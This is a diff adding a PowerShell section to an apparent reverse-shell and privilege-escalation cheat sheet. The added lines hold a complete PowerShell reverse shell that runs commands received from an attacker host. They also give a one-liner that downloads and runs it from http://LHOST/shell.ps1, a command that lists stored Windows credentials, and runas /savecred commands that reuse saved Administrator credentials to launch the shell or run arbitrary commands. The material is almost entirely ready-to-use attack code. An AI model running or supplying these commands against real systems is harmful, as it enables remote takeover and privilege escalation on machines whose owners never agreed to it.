@@ -85,6 +85,22 @@ command to execute on the listener side to connect to the remote machine :
 ```bash
 nc -lvp LPORT
 ```
+
+### powershell
+In http://LHOST/shell.ps1 :  
+```shell
+$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+In target machine :  
+```START /B "" powershell -c IEX (New-ObjectNet.Webclient).downloadstring('http://LHOST/shell.ps1') ```
+
+A useful command to run when beginning enumeration, which displays stored user names and passwords or credentials :  
+```cmdkey /list```
+Exploitation to have reverse shell :  
+``` runas /user:[user]\Administrator /savecred "powershell -c IEX (New-ObjectNet.Webclient).downloadstring('http://LHOST/shell.ps1')"```  
+Exploitation to run command :  
+```runas /savecred /user:[user]\Administrator "cmd.exe /C [CMD]"```
+
 ### netcat
 Linux : 
 ```bash
